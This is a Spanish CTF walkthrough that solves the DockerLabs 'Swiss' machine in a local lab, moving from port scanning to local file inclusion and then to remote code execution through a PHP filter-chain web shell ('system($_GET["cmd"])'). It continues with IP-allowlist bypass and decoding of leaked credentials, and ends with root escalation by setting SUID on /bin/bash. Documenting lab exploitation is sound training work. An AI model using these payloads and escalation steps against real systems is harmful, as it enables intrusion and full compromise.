#MAQUINA #DOCKERLABS #MEDIO
#LFI #PHP_WRAPPERS #RCE
#CHANGE_IP #WIRESHARK
<hr>

# RECONOCIMIENTO

Vamos a resolver **Swiss** de la plataforma **DockerLabs**.

   ```bash

Máquina desplegada, su dirección IP es --> 172.17.0.2

```

Primero vamos a hacer un escaneo de puertos rápido:

```bash

nmap -sS --min-rate 5000 -vvv -n -Pn -p- 172.17.0.2 --open
Host discovery disabled (-Pn). All addresses will be marked 'up' and scan times may be slower.
Starting Nmap 7.94SVN ( https://nmap.org ) at 2025-02-12 18:16 CET
Initiating ARP Ping Scan at 18:16
Scanning 172.17.0.2 [1 port]
Completed ARP Ping Scan at 18:16, 0.07s elapsed (1 total hosts)
Initiating SYN Stealth Scan at 18:16
Scanning 172.17.0.2 [65535 ports]
Discovered open port 22/tcp on 172.17.0.2
Discovered open port 80/tcp on 172.17.0.2
Completed SYN Stealth Scan at 18:16, 1.64s elapsed (65535 total ports)
Nmap scan report for 172.17.0.2
Host is up, received arp-response (0.000021s latency).
Scanned at 2025-02-12 18:16:15 CET for 2s
Not shown: 65533 closed tcp ports (reset)
PORT   STATE SERVICE REASON
22/tcp open  ssh     syn-ack ttl 64
80/tcp open  http    syn-ack ttl 64
MAC Address: 02:42:AC:11:00:02 (Unknown)

Read data files from: /usr/share/nmap
Nmap done: 1 IP address (1 host up) scanned in 1.86 seconds
           Raw packets sent: 65536 (2.884MB) | Rcvd: 65536 (2.621MB)


```

- **`--open`**: Muestra solo los puertos abiertos en la salida.
- **`-sS`**: Especifica un escaneo TCP SYN, que es más sigiloso que un escaneo de conexión completa.
- **`--min-rate 5000`**: Establece la tasa mínima de paquetes enviados a 5000 por segundo, haciendo que el escaneo sea más rápido.
- **`-vvv`**: Aumenta el nivel de verbosidad, proporcionando una salida más detallada durante el escaneo.
- **`-n`**: No resuelve DNS; esto evita retrasos por búsquedas de nombres.
- **`-Pn`**: Trata el objetivo como si estuviera en línea; omite el descubrimiento de hosts.
- **`-p-`**: Escanea todos los 65535 puertos en lugar de solo los más comunes.

**Conclusiones:** El ttl al ser 64 nos dice que es una máquina **Linux**. Además, vemos que tiene los puertos **80(HTTP)**, **22(SSH)** abiertos.

Ahora vamos a hacer un escaneo con mayor detalle:

   ```bash

nmap -sCV -p22,80 172.17.0.2                             
Starting Nmap 7.94SVN ( https://nmap.org ) at 2025-02-12 18:16 CET
Nmap scan report for realgob.dl (172.17.0.2)
Host is up (0.00012s latency).

PORT   STATE SERVICE    VERSION
22/tcp open  ssh        OpenSSH 9.6p1 Ubuntu 3ubuntu13.5 (Ubuntu Linux; protocol 2.0)
| ssh-hostkey: 
|_  256 f1:2d:b0:54:e3:57:94:c8:3a:1a:7a:ba:d8:2d:7e:f9 (ECDSA)
80/tcp open  tcpwrapped
|_http-server-header: Apache/2.4.58 (Ubuntu)
|_http-title: \xF0\x9F\x91\x8B Mario \xC3\x81lvarez Fer\xC5\x84andez
MAC Address: 02:42:AC:11:00:02 (Unknown)
Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel

Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 5.92 seconds


```

```bash

nmap --script="http-enum" 172.17.0.2
Starting Nmap 7.94SVN ( https://nmap.org ) at 2025-02-12 18:17 CET
Nmap scan report for realgob.dl (172.17.0.2)
Host is up (0.000021s latency).
Not shown: 998 closed tcp ports (reset)
PORT   STATE SERVICE
22/tcp open  ssh
80/tcp open  http
| http-enum: 
|   /images/: Potentially interesting directory w/ listing on 'apache/2.4.58 (ubuntu)'
|_  /scripts/: Potentially interesting directory w/ listing on 'apache/2.4.58 (ubuntu)'
MAC Address: 02:42:AC:11:00:02 (Unknown)

Nmap done: 1 IP address (1 host up) scanned in 0.47 seconds


```

- **`-sC`**: Realiza un escaneo de scripts (Nmap Scripting Engine, NSE). Esto permite ejecutar scripts de `nmap` para obtener información adicional sobre los servicios detectados, como vulnerabilidades, configuraciones o detalles específicos de los mismos.
- **`-sV`**: Realiza la detección de versiones de servicios. Esto intenta identificar la versión exacta del software que está escuchando en un puerto abierto, lo que puede ayudar a determinar si hay vulnerabilidades conocidas.
- **`--script`**:  Ejecutar un script específico.


## HTTP (80)

Al revisar la web que hay en el puerto 80, vamos a utilizar **gobuster** para ver directorios interesantes:

   ```bash

gobuster dir -u http://172.17.0.2/ -w /usr/share/wordlists/seclists/Discovery/Web-Content/directory-list-2.3-medium.txt -t 20 -x html,php,js,txt,png,jpg
===============================================================
Gobuster v3.6
by OJ Reeves (@TheColonial) & Christian Mehlmauer (@firefart)
===============================================================
[+] Url:                     http://172.17.0.2/
[+] Method:                  GET
[+] Threads:                 20
[+] Wordlist:                /usr/share/wordlists/seclists/Discovery/Web-Content/directory-list-2.3-medium.txt
[+] Negative Status codes:   404
[+] User Agent:              gobuster/3.6
[+] Extensions:              png,jpg,html,php,js,txt
[+] Timeout:                 10s
===============================================================
Starting gobuster in directory enumeration mode
===============================================================
/.php                 (Status: 403) [Size: 275]
/.html                (Status: 403) [Size: 275]
/index.php            (Status: 200) [Size: 22274]
/images               (Status: 301) [Size: 309] [--> http://172.17.0.2/images/]
/scripts              (Status: 301) [Size: 310] [--> http://172.17.0.2/scripts/]
/.php                 (Status: 403) [Size: 275]
/.html                (Status: 403) [Size: 275]
/server-status        (Status: 403) [Size: 275]
Progress: 1196291 / 1543920 (77.48%)[ERROR] read tcp 172.17.0.1:53484->172.17.0.2:80: read: connection reset by peer
Progress: 1543913 / 1543920 (100.00%)
===============================================================
Finished
===============================================================


```

Vemos solo un **index.php**

# EXPLOTACION

Al revisar el **index.php** utilizando **wfuzz** :

```bash
wfuzz -u "http://172.17.0.2/index.php?FUZZ=/etc/hosts" -w /usr/share/seclists/Discovery/Web-Content/directory-list-lowercase-2.3-medium.txt  --hl=447
********************************************************
* Wfuzz 3.1.0 - The Web Fuzzer                         *
********************************************************

Target: http://172.17.0.2/index.php?FUZZ=/etc/hosts
Total requests: 207643

=====================================================================
ID           Response   Lines    Word       Chars       Payload                                                                                                                  
=====================================================================

000000741:   200        454 L    1381 W     22326 Ch    "file"                                                                                                                   

Total time: 0
Processed Requests: 207643
Filtered Requests: 207642
Requests/sec.: 0


```

Vemos que es vulnerable a un **LFI**.

Al apuntar al **/etc/passwd**, podemos sacar dos usuarios interesantes(**cristal** y **darks**) :

```bash
root:x:0:0:root:/root:/bin/bash
daemon:x:1:1:daemon:/usr/sbin:/usr/sbin/nologin
bin:x:2:2:bin:/bin:/usr/sbin/nologin
sys:x:3:3:sys:/dev:/usr/sbin/nologin
sync:x:4:65534:sync:/bin:/bin/sync
games:x:5:60:games:/usr/games:/usr/sbin/nologin
man:x:6:12:man:/var/cache/man:/usr/sbin/nologin
lp:x:7:7:lp:/var/spool/lpd:/usr/sbin/nologin
mail:x:8:8:mail:/var/mail:/usr/sbin/nologin
news:x:9:9:news:/var/spool/news:/usr/sbin/nologin
uucp:x:10:10:uucp:/var/spool/uucp:/usr/sbin/nologin
proxy:x:13:13:proxy:/bin:/usr/sbin/nologin
www-data:x:33:33:www-data:/var/www:/usr/sbin/nologin
backup:x:34:34:backup:/var/backups:/usr/sbin/nologin
list:x:38:38:Mailing List Manager:/var/list:/usr/sbin/nologin
irc:x:39:39:ircd:/run/ircd:/usr/sbin/nologin
_apt:x:42:65534::/nonexistent:/usr/sbin/nologin
nobody:x:65534:65534:nobody:/nonexistent:/usr/sbin/nologin
ubuntu:x:1000:1000:Ubuntu:/home/ubuntu:/bin/bash
messagebus:x:100:102::/nonexistent:/usr/sbin/nologin
darks:x:1001:1001::/home/darks:/bin/rbash
systemd-network:x:998:998:systemd Network Management:/:/usr/sbin/nologin
systemd-timesync:x:997:997:systemd Time Synchronization:/:/usr/sbin/nologin
systemd-resolve:x:996:996:systemd Resolver:/:/usr/sbin/nologin
sshd:x:101:65534::/run/sshd:/usr/sbin/nologin
cristal:x:1002:1002:,,,:/home/cristal:/bin/bash
tcpdump:x:102:105::/nonexistent:/usr/sbin/nologin
```

Al usar **hydra** da error. Intentaremos hacer un RCE mediante **php wrappers** para ejecutar comandos remotamente sin subir archivo.

Nos descargamos [PHP Filter Chain Generator](https://github.com/synacktiv/php_filter_chain_generator) , ya que podremos colar comandos usándola.

```bash

./php_filter_chain_generator.py   --chain  '<?php system($_GET["cmd"]);?>'

http://172.17.0.2/index.php?file=<PHP CHAIN>&cmd=ls -l

```

Al hacer un **ls -l**, vemos un **credentials.txt** que tiene muchas cosas ilegibles, por lo que :

```bash
strings credentials.txt | grep "darks"
        echo "<div class='login-container'><h2>Darks, el sistema a sido configurado para restringir un rango de ip por seguridad, ten esto en cuenta ya que si no te encuentras en el segmento correcto nada funcionara, tus nuevas credenciales ssh son: darks:_dkvndsqwcdfef34445 </h2></div>";

```

Tenemos las credenciales ssh de **darks** y vemos que están restringiendo IPs.

Al hacer mirar los procesos con ps, vemos que podemos usar IPs a partir de la 151 incluida, por lo que en mi caso:

```bash

sudo ip address del 172.17.0.1/16 dev docker0
sudo ip address add 172.17.0.151/16 dev docker0

```

YA ESTAMOS COMO DARKS. AL ENTRAR VEMOS QUE NO NOS SIRVE ESTAMOS EN UNA RBASH.

Al curiosear un poco mas:

```bash

http://172.17.0.2/index.php?file=<PHP CHAIN>&cmd=cd .. ; ls -l

```

Vemos que hay un ejecutable **sendinv2** y si le aplicamos un strings:

```bash

http://172.17.0.2/index.php?file=<PHP CHAIN>&cmd=cd .. ; strings sendinv2

```

Vemos lo siguiente:

```bash

Error al crear el socket
172.17.0.188
Error al enviar datos

```

Por lo que vamos a cambiarnos de IP y vamos a usar **wireshark**.
Vemos que nos intenta enviar paquetes a nuestro puerto 7777 mediante UDP -> `nc -nlvup 7777`

Nos envía lo siguiente:

```bash

MFDTS42ZKNCWOYZSHF2GEM2NM5NFO53HLIZUUMLDI44GOULNPBUFSMTUIRMVQULTJFEEE3DCNZHGQYSXHF5ESR2WOVEUOVTVLEZUU4DDJBJGQY3JIJWGGM2SNQFESSCONRRW4WTMMNUUE522LBFHMSKHGV3ESSCSOBNFONLMJFDTK2C2I5CWOWSHKVTWCVZVGBNFQSTMMN4XOZ3EI5KWOWKXNB3GG3SKNBRW2VLHMRDWY3DCLBBHMCSPNFBGUY3NNR5GIR2GONHW2UTZMIZUE2TBI44XUZCHHF3U4RCVPJKTA4CHJFCG6Z22I5WHUWTOJIYWIR2FJMFA====

```

Esta codificado en base32 y base64 :

```bash
echo 'MFDTS42ZKNCWOYZSHF2GEM2NM5NFO53HLIZUUMLDI44GOULNPBUFSMTUIRMVQULTJFEEE3DCNZHGQYSXHF5ESR2WOVEUOVTVLEZUU4DDJBJGQY3JIJWGGM2SNQFESSCONRRW4WTMMNUUE522LBFHMSKHGV3ESSCSOBNFONLMJFDTK2C2I5CWOWSHKVTWCVZVGBNFQSTMMN4XOZ3EI5KWOWKXNB3GG3SKNBRW2VLHMRDWY3DCLBBHMCSPNFBGUY3NNR5GIR2GONHW2UTZMIZUE2TBI44XUZCHHF3U4RCVPJKTA4CHJFCG6Z22I5WHUWTOJIYWIR2FJMFA====' | base32 -d | base64 -d

```

Lo que resulta en :

```bash
hola! somos el grupo BlackCat, pensamos en encriptar este server pero no tiene nada de interes, te ahorrare tiempo: cristal:dropchostop453SJF : disfruta
```

YA ESTAMOS COMO CRISTAL.

# ESCALADA PRIVILEGIOS

Al hacer **ps -ef** vemos que el archivo **/home/cristal/systm.sh** es ejecutado por root todo el rato, lo que hace es compilar el .c y ejecutarlo , y podemos editarlo ya que pertenecemos al grupo editor.

```bash

cristal@5b1ecf9e12fd:~$ id
uid=1002(cristal) gid=1002(cristal) groups=1002(cristal),100(users),1003(editor)
cristal@5b1ecf9e12fd:~$ cat systm.c
int main() {
    // Comando a ejecutar
    const char *command = "chmod +s /bin/bash";

    // Ejecutar el comando usando system()
    (void)system(command); // Ignorar el resultado

    return 0;
}
cristal@5b1ecf9e12fd:~$ ls -la /bin/bash
-rwsr-sr-x 1 root root 1446024 Mar 31  2024 /bin/bash
cristal@5b1ecf9e12fd:~$ /bin/bash -p
bash-5.2# whoami
root
bash-5.2# 

```

**YA ESTAMOS COMO ROOT.**